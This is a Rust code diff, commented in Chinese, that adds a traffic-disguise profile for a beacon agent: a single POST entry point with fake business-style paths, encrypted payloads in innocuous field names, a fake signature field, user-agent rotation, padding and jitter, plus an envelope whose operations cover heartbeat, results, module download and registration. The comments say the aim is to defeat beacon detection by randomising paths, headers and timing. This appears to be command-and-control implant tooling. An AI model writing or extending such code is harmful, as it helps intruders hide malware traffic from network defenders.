@@ -310,6 +310,98 @@ fn default_core_key_path() -> String {
     "/api/beacon/core-key".into()
 }
 
+// ── 流量伪装 Profile（单入口内部路由）──────────────────────────────────
+
+/// 注册响应下发的流量伪装配置。
+///
+/// 设计：控制面全部走「单入口 POST + 密文内部路由」——
+///   所有 beacon 请求 POST 到 `entry_path`，请求体是业务风格的外层壳：
+///     { "<data_key>": "<AES-GCM 密文>", "<ts_key>": <毫秒时间戳>, "<rand_key>": "<随机hex>" }
+///   密文内部是路由信封（见 `BeaconEnvelope`）：op 决定服务端分发
+///   （心跳/结果/模块下载/注册），agent 标识 token 也在密文内。
+///
+/// 效果：无固定标识头、无可枚举功能路径、路径/字段名/UA/节奏全部可配置，
+/// 信标检测三要素（路径/头/节奏）随机化。
+#[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(rename_all = "camelCase")]
+pub struct ProfileTransform {
+    /// 单入口路径前缀（如 /api、/index.php、/graphql）。服务端按此前缀路由，
+    /// 之后的路径段全部忽略（虚假业务地址）。
+    #[serde(default = "default_entry_path")]
+    pub entry_path: String,
+    /// 虚假业务路径段列表：每次请求随机拼一个到入口后
+    /// （如 /api/user/info、/api/orders/123），空 = 不加后缀。
+    #[serde(default)]
+    pub path_suffixes: Vec<String>,
+    /// 外层壳：密文字段名。
+    #[serde(default = "default_data_key")]
+    pub data_key: String,
+    /// 外层壳：时间戳字段名。
+    #[serde(default = "default_ts_key")]
+    pub ts_key: String,
+    /// 外层壳：随机字段名。
+    #[serde(default = "default_rand_key")]
+    pub rand_key: String,
+    /// 外层壳：假签名字段名（空 = 不加签名）。
+    /// 值为 HMAC-SHA256(beacon_secret, ts|data) 的 hex —— 真实算法，
+    /// 让请求在结构上等价于带鉴权的业务 API。
+    #[serde(default = "default_sign_key")]
+    pub sign_key: String,
+    /// UA 轮换列表（空 = 用构建时的默认 UA）。
+    #[serde(default)]
+    pub user_agents: Vec<String>,
+    /// 心跳/结果明文尾部随机 padding 字符数范围（密文长度随机化）。
+    #[serde(default = "default_padding_min")]
+    pub padding_min: u32,
+    #[serde(default = "default_padding_max")]
+    pub padding_max: u32,
+    /// 心跳间隔（毫秒），注册响应覆盖构建时值。
+    #[serde(default)]
+    pub heartbeat_interval_ms: u64,
+    /// 抖动百分比（0.0-1.0）。
+    #[serde(default)]
+    pub jitter_percent: f64,
+}
+
+fn default_entry_path() -> String { "/api".into() }
+fn default_data_key() -> String { "d".into() }
+fn default_ts_key() -> String { "ts".into() }
+fn default_rand_key() -> String { "r".into() }
+fn default_sign_key() -> String { String::new() }
+fn default_padding_min() -> u32 { 0 }
+fn default_padding_max() -> u32 { 64 }
+
+impl Default for ProfileTransform {
+    fn default() -> Self {
+        Self {
+            entry_path: default_entry_path(),
+            path_suffixes: Vec::new(),
+            data_key: default_data_key(),
+            ts_key: default_ts_key(),
+            rand_key: default_rand_key(),
+            sign_key: default_sign_key(),
+            user_agents: Vec::new(),
+            padding_min: default_padding_min(),
+            padding_max: default_padding_max(),
+            heartbeat_interval_ms: 0,
+            jitter_percent: 0.0,
+        }
+    }
+}
+
+/// 密文内部的路由信封：op 决定服务端分发，token 为会话标识。
+#[derive(Debug, Clone, Serialize, Deserialize)]
+#[serde(rename_all = "camelCase")]
+pub struct BeaconEnvelope {
+    /// hb=心跳, res=结果, mod=模块下载, reg=注册
+    pub op: String,
+    /// 会话 token（reg 时为注册数据）
+    pub id: String,
+    /// 业务数据（JSON 字符串）
+    #[serde(default)]
+    pub data: String,
+}
+
 #[cfg(test)]
 mod tests {
     use super::*;
